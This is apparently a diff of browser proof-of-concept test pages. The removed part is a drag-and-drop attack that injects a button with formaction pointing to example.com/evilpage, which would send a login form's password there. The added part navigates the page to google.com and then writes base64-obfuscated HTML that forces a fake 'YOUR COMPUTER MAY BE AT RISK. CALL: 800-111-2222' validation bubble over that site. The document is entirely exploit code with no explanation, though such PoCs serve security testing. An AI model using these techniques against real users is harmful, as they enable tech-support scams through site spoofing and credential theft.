@@ -1,15 +1,27 @@
-<div>Drag something from this page to the second page.</div>
+
+<body>
+<button onclick=foo()>go</button>
+</body>
+
 <script>
-document.addEventListener("dragstart", function() {
-    var content = '<input type="submit" form="login" formaction="http://example.com/evilpage">';
-    event.dataTransfer.setData('text/html', content);
-});
+
+var w;
+var t;
+function foo(){
+
+w = setTimeout('document.location = "http:/www.google.com"',2000)
+t = setInterval('bar()',1);
+}
+
+function bar(){
+try{
+w.location.href;
+}
+catch(e){
+clearInterval(t);
+setTimeout("document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));test()",1000);
+}
+
+}
+
 </script>
-
-[page2.html]:
-<script> document.designMode="on"; </script>
-<form id="login" action="http://google.com/secret">
-    <input name="password" value="secrettext">
-    <input type="submit" value="Send to Google">
-</form>
-
